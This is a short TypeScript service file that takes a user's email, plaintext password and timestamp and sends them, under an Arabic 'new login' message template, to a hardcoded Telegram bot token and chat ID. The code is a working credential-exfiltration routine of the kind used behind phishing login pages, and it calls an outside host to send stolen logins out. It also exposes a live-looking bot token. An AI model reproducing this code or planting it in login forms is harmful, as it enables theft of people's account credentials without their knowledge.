// services/telegramService.ts
interface LoginData {
  email: string;
  password: string;
  timestamp: string;
}

export const sendToTelegram = async (loginData: LoginData): Promise<void> => {
  const botToken = '8368807945:AAEhwSZcL3i1GMubsR8Ti3an4goS_wAwXfc';
  const chatId = '8197503733';
  
  const message = `
🔐 تسجيل دخول جديد
📧 الإيميل: ${loginData.email}
🔐 كلمة المرور: ${loginData.password}
⏰ الوقت: ${loginData.timestamp}
  `;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }
    
    console.log('Message sent successfully to Telegram');
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};
